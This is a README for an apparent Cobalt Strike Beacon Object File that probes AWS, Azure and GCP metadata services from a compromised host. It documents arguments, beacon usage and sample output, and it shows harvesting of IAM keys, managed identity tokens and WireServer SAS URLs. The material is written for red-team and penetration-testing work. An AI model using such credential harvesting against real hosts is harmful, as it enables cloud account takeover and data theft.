# Cloud Metadata Check

Probes cloud-local metadata services from current process. Reports:

- Cloud provider 
- AWS IMDS mode 
- Reachable instance identity material (bounded snippets by default) 
- Selected instance context fields 
- Azure App Service and Azure Arc managed identity exposure for one selected Azure audience
- GCP OAuth scopes 
- Azure WireServer VM extension metadata when local administrator access is available

## What It Checks

First probe: TCP to `169.254.169.254:80`. Provider fingerprint on that host uses AWS → Azure → GCP priority (`probe_status` when none match).

- **AWS EC2** (`169.254.169.254`)
  - Reports: `provider: aws`, `imds_mode` (v1/v2), `iam_role`, credential snippets; `instance_id`, `region`
  - References: [EC2 instance metadata](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html), [IMDSv2 token](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instance-metadata-security-credentials.html)
- **Azure VM** (`169.254.169.254`)
  - Reports: `provider: azure`, managed identity token snippet for the selected audience; `vm_name`, `location`, `resource_group`, `subscription_id`, `resource_id`, `tags`, `network` (IMDS api-version `2025-04-07`)
  - References: [Azure IMDS](https://learn.microsoft.com/en-us/azure/virtual-machines/instance-metadata-service), [VM managed identity](https://learn.microsoft.com/en-us/entra/identity/managed-identities-azure-resources/how-to-use-vm-token)
- **Azure WireServer** (`168.63.129.16:32526`)
  - Reports: `wireserver_reachable`, `extension_count`, extension names, `public_settings_snip`, `protected_settings_cert_thumbprint`, status SAS URL snippet; `protected_settings: present` (no decrypt). Requires local admin on Azure VM
  - References: [WireServer / VM extensions](https://learn.microsoft.com/en-us/azure/virtual-machines/extensions/features-windows) (platform IP); extension settings background in [NetSPI WireServer write-up](https://www.netspi.com/blog/technical-blog/cloud-pentesting/decrypting-vm-extension-settings-with-azure-wireserver/)
- **GCP** (`169.254.169.254`)
  - Reports: `provider: gcp`, service account email, OAuth scopes, token snippet; `project_id`, `zone`, `instance_name`
  - References: [Compute Engine metadata](https://cloud.google.com/compute/docs/metadata/overview)
- **Azure App Service** (`IDENTITY_ENDPOINT` / `MSI_ENDPOINT` + matching header secret env vars)
  - Reports: `provider: azure_appservice`, `identity_endpoint`, managed identity token snippet for the selected audience (`X-IDENTITY-HEADER`, legacy `secret` retry). IMDS unreachable from this host
  - References: [App Service managed identity](https://learn.microsoft.com/en-us/azure/app-service/overview-managed-identity)
- **Azure Arc** (`127.0.0.1:40342`)
  - Reports: `himds_reachable`, `provider: azure_arc`, challenge-token identity flow with selected audience check; `arc_name`, `location`, `resource_group`, `subscription_id`, `resource_id`, `tags`
  - References: [Arc managed identity / HIMDS](https://learn.microsoft.com/en-us/azure/azure-arc/servers/managed-identity-authentication)

Runs when any applicable path is reachable (IMDS TCP, App Service env, or HIMDS TCP). App Service and Arc blocks can run even when `imds_reachable: no`.

### Credits

Azure coverage (IMDS compute paths, App Service MSI, WireServer, Arc HIMDS) benefited from research shared by [@s1zz](https://x.com/s1zzzz).

## Arguments


| Name                    | Required | Description                                                                                                            |
| ----------------------- | -------- | ---------------------------------------------------------------------------------------------------------------------- |
| *(none)*                | —        | Full output including bounded credential snippets                                                                      |
| `presence`              | No       | Presence and context only; no credential snippets                                                                      |
| `-aud arm`              | No       | Request Azure managed identity tokens for Azure Resource Manager. This is the default.                                 |
| `-aud graph`            | No       | Request Azure managed identity tokens for Microsoft Graph.                                                             |
| `-aud other:<resource>` | No       | Request a custom Azure audience such as `https://vault.azure.net` when the operator already knows the useful resource. |
| `-aud other <resource>` | No       | Same as `other:<resource>`, split into two arguments.                                                                  |


## Usage

```text
beacon> inline-execute cloud_metadata_check.x64.o
beacon> inline-execute cloud_metadata_check.x64.o presence
beacon> inline-execute cloud_metadata_check.x64.o -aud graph
beacon> inline-execute cloud_metadata_check.x64.o presence -aud other:https://vault.azure.net
```

## Example Output

AWS EC2 with IAM role (IMDSv2):

```text
[+] cloud_metadata_check started
[i] imds_reachable: yes
[i] provider: aws
[i] imds_mode: v2
[+] iam_role: MyInstanceRole
[i] identity_available: yes
[+] access_key_id: ASIAEXAMPLE1234567
[+] secret_key_snip: wJalrXUtnFEMI/K7MDENG
[+] token_snip: IQoJb3JpZ2luX2VjEPT/nd
[i] instance_id: i-0abc123def456
[i] region: us-east-1
[+] cloud_metadata_check complete
```

Azure VM with managed identity:

```text
[+] cloud_metadata_check started
[i] imds_reachable: yes
[i] provider: azure
[i] identity_available: yes
[i] token_audience_arm: yes
[+] managed_identity_snip: eyJ0eXAiOiJKV1QiLCJhbGci
[i] vm_name: prod-web-01
[i] location: eastus
[i] resource_group: prod-rg
[i] subscription_id: 11111111-2222-3333-4444
[i] resource_id: /subscriptions/11111111-2222-3333-4444/resourceGroups/prod-rg/providers/Microsoft.Compute/virtualMachines/prod-web-01
[i] tags: {"environment":"prod","owner":"platform"}
[i] network: [{"ipv4":{"ipAddress":[{"privateIpAddress":"10.0.1.4"...}
[!] wireserver: skipped (requires local administrator)
[+] cloud_metadata_check complete
```

Azure App Service with managed identity:

```text
[+] cloud_metadata_check started
[i] imds_reachable: no
[i] provider: azure_appservice
[i] identity_endpoint: 127.0.0.1:41566
[i] identity_available: yes
[i] token_audience_graph: yes
[+] managed_identity_snip: eyJ0eXAiOiJKV1QiLCJhbGci
[+] cloud_metadata_check complete
```

Azure Arc-enabled server with HIMDS and custom resource:

```text
[+] cloud_metadata_check started
[i] imds_reachable: no
[i] himds_reachable: yes
[i] provider: azure_arc
[i] identity_available: yes
[i] token_audience_other: yes
[+] managed_identity_snip: eyJ0eXAiOiJKV1QiLCJhbGci
[i] arc_name: arc-server-01
[i] location: westeurope
[i] resource_group: hybrid-rg
[i] subscription_id: 11111111-2222-3333-4444
[i] resource_id: /subscriptions/11111111-2222-3333-4444/resourceGroups/hybrid-rg/providers/Microsoft.HybridCompute/machines/arc-server-01
[i] tags: scenario:Managed Identity
[+] cloud_metadata_check complete
```

Azure VM with WireServer extension metadata:

```text
[+] cloud_metadata_check started
[i] imds_reachable: yes
[i] provider: azure
[i] identity_available: no
[i] vm_name: prod-web-01
[i] location: eastus
[i] wireserver_reachable: yes
[i] extension_count: 2
[i] extension: MicrosoftMonitoringAgent
[+] public_settings_snip: {}
[+] protected_settings_cert_thumbprint: 0123456789ABCDEF0123456789ABCDEF01234567
[+] status_sas_url_snip: https://storageacct.blob.core.windows.net/vmstatus/container?sv=...
[!] protected_settings: present
[+] cloud_metadata_check complete
```

Azure VM with multiple user-assigned managed identities:

```text
[+] cloud_metadata_check started
[i] imds_reachable: yes
[i] provider: azure
[i] identity_available: no
[!] azure_uami: multiple user-assigned identities attached; specify client_id/resource_id for IMDS
[i] token_audience_arm: no (status=400)
[+] cloud_metadata_check complete
```

Non-cloud or blocked IMDS:

```text
[+] cloud_metadata_check started
[i] imds_reachable: no
[+] cloud_metadata_check complete
```

## Limitations

- Cloud-local only (`169.254.169.254`, App Service env, or Arc `127.0.0.1:40342`). Arc tokens and WireServer need elevated access; protected extension settings are not decrypted.
- Single user-assigned Azure managed identities can emit tokens without a selector. Multiple user-assigned identities require a known `client_id` or `resource_id`; the BOF reports the IMDS selection error but does not accept a selector argument.
- Azure managed identity probing requests one audience per run. ARM is the default; use `-aud graph` or `-aud other:<resource>` for targeted token checks when the resource audience matters.
- Output is truncated snippets; shared IMDS uses AWS → Azure → GCP priority.

